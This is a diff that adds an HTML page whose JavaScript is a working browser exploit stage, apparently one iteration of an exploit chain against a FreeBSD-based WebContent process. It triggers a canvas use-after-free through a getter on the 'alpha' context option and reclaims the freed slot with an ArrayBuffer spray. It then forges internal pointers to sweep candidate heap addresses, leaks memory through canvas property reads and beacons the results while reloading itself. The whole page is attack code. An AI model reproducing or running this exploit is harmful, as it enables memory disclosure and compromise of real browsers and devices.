@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8">
+<meta http-equiv="Cache-Control" content="no-cache,no-store,must-revalidate">
+<title>V656</title></head>
+<body><pre id="out">V656 — wide-range coarse heap mapper</pre>
+<script>
+'use strict';
+var O=document.getElementById('out');
+function say(s){O.textContent+='\n'+s;}
+var _imgs=[];for(var i=0;i<60;i++)_imgs.push(new Image());
+var _ix=0;
+function bk(tag,d){
+  var img=_imgs[_ix++%60];
+  img.src='/beacon/V656-'+tag+'?d='+encodeURIComponent(String(d).slice(0,900))+'&t='+Date.now();
+}
+var _b8=new ArrayBuffer(8),_f64=new Float64Array(_b8),_u32=new Uint32Array(_b8);
+var _bu;try{_bu=new BigUint64Array(_b8);}catch(e){}
+function f2big(v){if(_bu){_f64[0]=v;return '0x'+_bu[0].toString(16);}
+  _f64[0]=v;return '0x'+('00000000'+_u32[1].toString(16)).slice(-8)+('00000000'+_u32[0].toString(16)).slice(-8);}
+
+/*
+ * WIDE-RANGE COARSE MAPPER
+ * ========================
+ * V655 wasted probes on a 24MB range that's entirely unmapped.
+ * WebContent has different ASLR from the Lua loader.
+ *
+ * Strategy: sweep 6GB at coarse resolution to FIND the heap first.
+ *
+ * Phase 1: 0x200000000-0x400000000 at 32MB steps  (64 probes)
+ *          This is the most likely heap region on FreeBSD amd64
+ * Phase 2: 0x100000000-0x200000000 at 64MB steps  (16 probes)
+ *          Lower address space
+ * Phase 3: 0x400000000-0x800000000 at 64MB steps  (64 probes)
+ *          Higher mmap region
+ *
+ * Total: ~144 probes covering 7GB
+ * On HIT: read lineWidth/miterLimit/globalAlpha/shadowBlur + page at +0x1000
+ */
+
+var PROBES = [];
+
+/* Phase 1: likely heap — 0x200000000-0x3FFFFFFFF at 32MB */
+for (var a = 0; a < 64; a++) {
+  var lo = a * 0x2000000;     // 32MB steps
+  var hi = 0x00000002;
+  lo = lo >>> 0;
+  if (lo >= 0x100000000) { lo = (lo - 0x100000000) >>> 0; hi++; }
+  /* Handle full 8GB range: hi=2 for 0x200000000, hi=3 for 0x300000000+ */
+  PROBES.push({hi: hi, lo: lo, tag: 'P1-' + a});
+}
+
+/* Phase 2: lower — 0x100000000-0x1FFFFFFFF at 64MB */
+for (var b = 0; b < 16; b++) {
+  PROBES.push({hi: 0x00000001, lo: (b * 0x4000000) >>> 0, tag: 'P2-' + b});
+}
+
+/* Phase 3: higher — 0x400000000-0x7FFFFFFFF at 64MB */
+for (var c = 0; c < 64; c++) {
+  var lo3 = c * 0x4000000;
+  var hi3 = 0x00000004;
+  lo3 = lo3 >>> 0;
+  if (lo3 >= 0x100000000) { lo3 = (lo3 - 0x100000000) >>> 0; hi3++; }
+  PROBES.push({hi: hi3, lo: lo3, tag: 'P3-' + c});
+}
+
+var MAX = PROBES.length;
+
+/* State */
+var idx = 0;
+try { idx = parseInt(localStorage.getItem('v656_idx')) || 0; } catch(e) {}
+var results = [];
+try { results = JSON.parse(localStorage.getItem('v656_res') || '[]'); } catch(e) { results = []; }
+
+var hits = results.filter(function(r){return r.s==='H';}).length;
+var misses = results.filter(function(r){return r.s==='M';}).length;
+
+bk('BOOT', 'i='+idx+'/'+MAX+'|hits='+hits+'|miss='+misses);
+say('Probe '+idx+'/'+MAX);
+say('Hits: '+hits+' / Misses: '+misses);
+
+if (idx >= MAX) {
+  var summary = results.map(function(r){return r.a+':'+r.s;}).join(',');
+  bk('DONE', 'total='+results.length+'|hits='+hits+'|'+summary.slice(0,800));
+  say('\n=== SCAN COMPLETE ===');
+  say('HITS:');
+  results.forEach(function(r){
+    if(r.s==='H') say('  '+r.a+' '+r.d);
+  });
+  say('\nFull map:');
+  results.forEach(function(r){
+    say((r.s==='H'?'[HIT]  ':'[    ] ')+r.a);
+  });
+} else {
+  var p = PROBES[idx];
+  var probeHi = p.hi;
+  var probeLo = p.lo;
+
+  var addrHex = '0x'+('00000000'+probeHi.toString(16)).slice(-8)+('00000000'+(probeLo>>>0).toString(16)).slice(-8);
+  bk('TGT', 'i='+idx+'|'+p.tag+'|'+addrHex);
+  say('-> '+addrHex+' ('+p.tag+')');
+
+  /* Pre-save as MISS */
+  results.push({a:addrHex, s:'M', t:p.tag});
+  try {
+    localStorage.setItem('v656_idx', String(idx + 1));
+    localStorage.setItem('v656_res', JSON.stringify(results));
+  } catch(e) {}
+
+  /* === UAF TRIGGER === */
+  var canvas = document.createElement('canvas');
+  canvas.width = 1; canvas.height = 1;
+  var innerCtx = null;
+  var uafOpts = {};
+  Object.defineProperty(uafOpts, 'alpha', {get: function() {
+    innerCtx = canvas.getContext('2d');
+    return true;
+  }});
+  canvas.getContext('bitmaprenderer', uafOpts);
+
+  if (!innerCtx) {
+    bk('FAIL', 'no-inner');
+    setTimeout(function(){location.reload();},2000);
+  } else {
+    /* Flush small allocs */
+    for (var f = 0; f < 600; f++) new ArrayBuffer(16);
+
+    /* Spray 768B ABs to reclaim freed slot */
+    var abs = new Array(200);
+    var dvs = new Array(200);
+    for (var ss = 0; ss < 200; ss++) {
+      abs[ss] = new ArrayBuffer(768);
+      dvs[ss] = new DataView(abs[ss]);
+    }
+
+    /* Forge m_stateStack → target */
+    for (var w = 0; w < 200; w++) {
+      dvs[w].setUint32(112, probeLo>>>0, true);
+      dvs[w].setUint32(116, probeHi, true);
+      dvs[w].setUint32(120, 2, true);
+      dvs[w].setUint32(124, 1, true);
+    }
+
+    /* CRITICAL READ — crashes if unmapped */
+    var lw = innerCtx.lineWidth;
+
+    /* ===== HIT ===== */
+    var lwB = f2big(lw);
+    bk('HIT', '***'+addrHex+'|'+p.tag+'|lw='+lwB+'***');
+    say('*** HIT *** '+addrHex+' lw='+lwB);
+
+    /* Multi-offset read */
+    var ml=-1,ga=-1,sb=-1;
+    try{ml=innerCtx.miterLimit;}catch(e){ml=-888;}
+    try{ga=innerCtx.globalAlpha;}catch(e){ga=-888;}
+    try{sb=innerCtx.shadowBlur;}catch(e){sb=-888;}
+    var mlB=f2big(ml), gaB=f2big(ga), sbB=f2big(sb);
+
+    /* Re-forge +0x1000 */
+    var probeLo2 = (probeLo + 0x1000)>>>0;
+    var probeHi2 = probeHi + (probeLo + 0x1000 > 0xFFFFFFFF ? 1 : 0);
+    for (var w2 = 0; w2 < 200; w2++) {
+      dvs[w2].setUint32(112, probeLo2, true);
+      dvs[w2].setUint32(116, probeHi2, true);
+    }
+    var lw2=-1,ml2=-1;
+    try{lw2=innerCtx.lineWidth;}catch(e){lw2=-888;}
+    try{ml2=innerCtx.miterLimit;}catch(e){ml2=-888;}
+    var lw2B=f2big(lw2), ml2B=f2big(ml2);
+
+    var dataStr = 'lw='+lwB+'|ml='+mlB+'|ga='+gaB+'|sb='+sbB+'|lw+4K='+lw2B+'|ml+4K='+ml2B;
+    bk('DATA', addrHex+'|'+dataStr);
+    say('  '+dataStr);
+
+    /* Update result to HIT */
+    results[results.length-1] = {a:addrHex, s:'H', t:p.tag, d:dataStr};
+    try { localStorage.setItem('v656_res', JSON.stringify(results)); } catch(e) {}
+
+    /* Clean forge */
+    innerCtx = null;
+    for (var cc = 0; cc < 200; cc++) {
+      dvs[cc].setFloat64(112, 0, true);
+      dvs[cc].setUint32(120, 0, true);
+      dvs[cc].setUint32(124, 0, true);
+    }
+    canvas._abs = abs;
+  }
+
+  bk('NEXT', 'reload-2s');
+  setTimeout(function(){location.reload();}, 2000);
+}
+</script>
+</body></html>
